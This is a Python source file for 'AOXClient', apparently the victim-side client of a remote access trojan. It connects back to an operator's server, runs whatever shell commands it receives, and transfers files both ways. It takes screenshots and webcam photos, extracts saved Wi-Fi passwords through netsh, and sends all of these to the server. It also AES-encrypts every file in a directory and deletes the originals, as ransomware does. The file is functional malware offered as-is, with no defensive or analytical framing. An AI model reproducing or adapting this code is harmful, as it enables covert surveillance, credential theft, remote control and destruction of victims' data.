import os
import re
import cv2
import uuid
import time
import json
import socket
import platform
import subprocess
import numpy as np
from PIL import ImageGrab
from Crypto import Random
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Hash import SHA256


class AOXClient:

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None


    # tries to connect back to the server
    def establish_connection(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                break
            except socket.error as err:
                time.sleep(120)  # try to reconnect after 2 minutes

        self.sock.send(self.get_platform_info())  # send platform info back to server

        while True:
            cmd = self.sock.recv(65536).decode()
            if cmd == " ":
                self.sock.send(f"{self.style_text('AOX')} {str(os.getcwd())}:".encode())
            elif "get" in cmd:
                self.send_file(self.sock, cmd[4:])
            elif "send" in cmd:
                if "/" in cmd:
                    filename = cmd.split("/")[-1]
                    self.receive_file(self.sock, filename)
            elif cmd == "screenshot":
                self.screenshot(self.sock)
            elif cmd == "camshot":
                self.capture_webcam_Image(self.sock)
            elif cmd == "wifi_passwords":
                self.get_known_wifi_password(self.sock)
            elif cmd == "conn check":
                pass
            elif "encrypt" in cmd:
                cmd = cmd.split(" ", 2)
                if len(cmd) == 2:
                    self.encrypt_All_Files(self.sock, "".join(cmd[1]), "".join(os.getcwd()))
            elif "decrypt" in cmd:
                cmd = cmd.split(" ", 2)
                if len(cmd) == 2:
                    self.decrypt_All_Files(self.sock, "".join(cmd[1]), "".join(os.getcwd()))
            elif cmd[:2] == 'cd':
                # change directory
                try:
                    os.chdir(cmd[3:])
                    result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                              stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    result = result.stdout.read() + result.stderr.read()
                    result = "\n" + result.decode()
                    if "The system cannot find the path specified." in result:
                        result = "\n"
                        self.sock.send(f"{str(result)}{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
                    else:
                        self.sock.send(f"{str(result)}{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
                except(FileNotFoundError, IOError):
                    self.sock.send(f"Directory does not exist!!! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
            else:
                # return terminal output back to server
                terminal_output = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                                        stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                terminal_output = terminal_output.stdout.read() + terminal_output.stderr.read()
                terminal_output = terminal_output.decode()
                self.sock.send(f"{str(terminal_output)}{self.style_text('AOX')} {str(os.getcwd())}: ".encode())



    # sends file to server
    def send_file(self, conn, usrFile):
            try:
                if not os.path.exists(usrFile):
                    conn.send(f"[-]File does not exist! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
                elif not os.path.isfile(usrFile):
                    if os.path.isdir(usrFile):
                        conn.send(
                            f"[-]'{usrFile}' is a directory, not a file! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
                    else:
                        conn.send(
                            f"[-]'{usrFile}' is not a regular file! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
                else:
                    conn.send(f"{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
                    time.sleep(1)
                    fileSize = os.path.getsize(usrFile)
                    conn.send(str(fileSize).encode())
                    time.sleep(1)
                    with open(usrFile, 'rb') as file:
                        data = file.read(1024)
                        if fileSize == 0:
                            pass
                        elif fileSize < 1024:
                            conn.send(data)
                            file.close()
                        else:
                            while data:
                                conn.send(data)
                                data = file.read(1024)
                            file.close()
            except Exception as e:
                conn.send(f"{e}\n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())



    # receives file from server
    def receive_file(self, conn, usrFile):
        try:
            fileSize = int(conn.recv(1024).decode())

            if fileSize == 0:  # if file is empty do nothing
                conn.send(f"{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
            else:
                # open a new file
                with open(usrFile, 'wb') as file:
                    if fileSize < 1024:
                        data = conn.recv(1024)
                        file.write(data)
                        file.close()
                    else:
                        data = conn.recv(1024)
                        totalFileRecv = len(data)

                        while totalFileRecv < fileSize:
                            totalFileRecv += len(data)
                            file.write(data)
                            data = conn.recv(1024)
                        file.write(data)
                        file.close()
                conn.send(f"{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
        except Exception as e:
            conn.send(f"{e} \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())


    def get_known_wifi_password(self, conn):
        try:
            wifi_names = self.get_wifi_names()
            wifi_and_passwords = []

            for wifi in wifi_names:
                password = self.get_wifi_password(wifi)
                if password:
                    wifi_and_passwords.append(f"\t {wifi}: {password} \n")
                else:
                    wifi_and_passwords.append(f"\t {wifi}: (Open Wifi) \n")

            results = " ".join(wifi_and_passwords)
            print(results)
            conn.send(f"{results}{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
        except Exception as e:
            print(e)
            conn.send(f"{e} \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())


    def get_wifi_names(self):
        cmd = "netsh wlan show profiles"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        wifi_names = re.findall(r": (.*)", result.stdout)
        return wifi_names


    def get_wifi_password(self, wifi_name):
        cmd = f"netsh wlan show profile {wifi_name} key=clear"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        match = re.search(r"Key Content\s*: (.*)", result.stdout)
        return match.group(1) if match else None


    def style_text(self, text):
        return f"\033[1;33m{text}\033[0m"


    # returns client system information
    def get_platform_info(self):
        client_platform_info = platform.uname()
        client_platform_dict = {
            "mac_address": ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            "system": client_platform_info[0],
            "node": client_platform_info[1],
            "release": client_platform_info[2],
            "version": client_platform_info[3],
            "machine": client_platform_info[4]
        }
        return json.dumps(client_platform_dict).encode()



    # send a screenshot back to server
    def screenshot(self, conn):
        try:
            conn.send(f"{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
            img = ImageGrab.grab() # capture image
            img_np = np.array(img)
            frame = cv2.cvtColor(img_np, cv2.COLOR_RGB2BGR)
            imgName = "img.jpg" # image name
            cv2.imwrite(imgName, frame) # write image to a file
            cv2.destroyAllWindows()
            fileSize = os.path.getsize(imgName)

            conn.send(f"screenshot_{datetime.now()}".encode())
            time.sleep(1)
            conn.send(str(fileSize).encode())
            with open(imgName, 'rb') as file:
                content = file.read(1024)
                while content:
                    conn.send(content)
                    content = file.read(1024)
            file.close()
            os.remove("img.jpg") # remove image from client machine
        except Exception as e:
            conn.send(f"{e} \n {self.style_text('AOX')} {str(os.getcwd())}: ".encode())


    # send webcam image back to server
    def capture_webcam_Image(self, conn):
        try:
            conn.send(f"{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
            capture = cv2.VideoCapture(0)
            ret, frame = capture.read()  # capture frame by frame
            clientImage = "img.jpg"  # image name
            cv2.imwrite(clientImage, frame)  # write image to a file
            capture.release()  # release capture
            cv2.destroyAllWindows()

            fileSize = os.path.getsize(clientImage)
            conn.send(f"camshot_{datetime.now()}".encode())
            time.sleep(1)
            conn.send(str(fileSize).encode())
            # send file content
            with open(clientImage, 'rb') as file:
                content = file.read(1024)
                while content:
                    conn.send(content)
                    content = file.read(1024)
            file.close()
            os.remove(clientImage)  # remove image from client machine
        except Exception as e:
            conn.send(f"{e} \n {self.style_text('AOX')} {str(os.getcwd())}: ".encode())



    # encrypt all files in directory provided
    def encrypt_All_Files(self, conn, key, directory):
        file_counter = 0
        hashed_key = SHA256.new(key.encode('utf-8')).digest() # hash for extra randomisation
        if os.path.exists(directory):
            # store all files in directory in file_path
            file_paths = []
            for root, directories, files in os.walk(directory):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    file_paths.append(filepath)

            # encrypt all files listed in file_path
            for file in file_paths:
                file_counter += 1
                filename = file.split("\\")
                filename = "".join(filename[-1])

                encrypted_file = os.path.join(directory, f"(Encrypted) {filename}")  # append Encrypted to the beginning of the file
                filesize = str(os.path.getsize(file)).rjust(AES.block_size, '0')  # pad each block by 16
                IV = Random.new().read(AES.block_size)  # initialization vector for randomisation

                encrypt_file = AES.new(hashed_key, AES.MODE_CBC, IV)

                with open(file, 'rb') as usrFile:
                    with open(encrypted_file, 'wb') as outfile:
                        outfile.write(filesize.encode('utf-8'))
                        outfile.write(IV)

                        while True:
                            block = usrFile.read(65536)
                            if len(block) == 0:
                                break
                            elif len(block) % 16 != 0:
                                block += b' ' * (16 - (len(block) % 16))  # pad the rest of data to equal 16

                            outfile.write(encrypt_file.encrypt(block))  # encrypt block
                        usrFile.close()
                    os.remove(file)
            conn.send(f"[+]{str(file_counter)} files have been encrypted! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
        else:
            conn.send(f"[-]Directory or file specified does not exist! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())



    # decrypt all files in directory provided
    def decrypt_All_Files(self, conn, key, directory):
        file_counter = 0
        hashed_key = SHA256.new(key.encode('utf-8')).digest()
        if os.path.exists(directory):
            file_paths = []

            # Walk through the directory and gather all files
            for root, directories, files in os.walk(directory):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    file_paths.append(filepath)

            for usrFile in file_paths:
                file_counter += 1
                # Split the path to get the file name and extension separately
                file_name, file_extension = os.path.splitext(os.path.basename(usrFile))
                # Remove "(Encrypted)" from the file name if present and append extension
                outputFile = file_name.replace("(Encrypted)", "") + file_extension
                # Construct full path for the output file
                outputFile = os.path.join(directory, outputFile)

                with open(usrFile, 'rb') as encrypted_file:
                    filesize = int(encrypted_file.read(16))
                    IV = encrypted_file.read(AES.block_size)  # initialization vector for randomization
                    decryptor = AES.new(hashed_key, AES.MODE_CBC, IV)

                    with open(outputFile, 'wb') as decrypted_file:
                        while True:
                            block = encrypted_file.read(65536)

                            if len(block) == 0:
                                break

                            decrypted_file.write(decryptor.decrypt(block))

                        # Truncate the decrypted file to the original filesize
                        decrypted_file.truncate(filesize)

                # Remove the original (now decrypted) file
                os.remove(usrFile)

            conn.send(
                f"[+]{str(file_counter)} files have been decrypted! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
        else:
            conn.send(
                f"[-]Directory or file specified does not exist! \n{self.style_text('AOX')} {str(os.getcwd())}: ".encode())
